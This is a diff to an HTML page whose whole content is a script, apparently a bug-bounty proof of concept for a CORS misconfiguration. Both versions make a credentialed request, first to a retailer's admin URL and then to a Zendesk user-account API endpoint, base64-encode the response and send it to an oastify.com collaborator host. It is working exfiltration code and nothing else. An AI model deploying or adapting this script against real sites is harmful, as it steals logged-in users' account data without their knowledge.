@@ -1,13 +1,11 @@
 <html>
 <body>
  <script>
-fetch('https://admin.zara.com/', {method:'GET', credentials:'include'})
+fetch("https://h1-m2a2j2d-01.zendesk.com/api/v2/users/me.json", {
+  credentials: "include"
+})
 .then(res => res.json())
-.then(data => fetch('https://6lsuev90me7wng5xrraveegympsggc41.oastify.com/'+btoa(JSON.stringify(data))))
-.then(res => res.json())
-.then(finalData => console.log(finalData))
-.catch(err => console.error(err));
-alert('successful');
+.then(data => fetch("https://n5tstpaomctkaes0a9lnibse55bwznnc.oastify.com/log?" + btoa(JSON.stringify(data))));
 </script>
 </body>
 
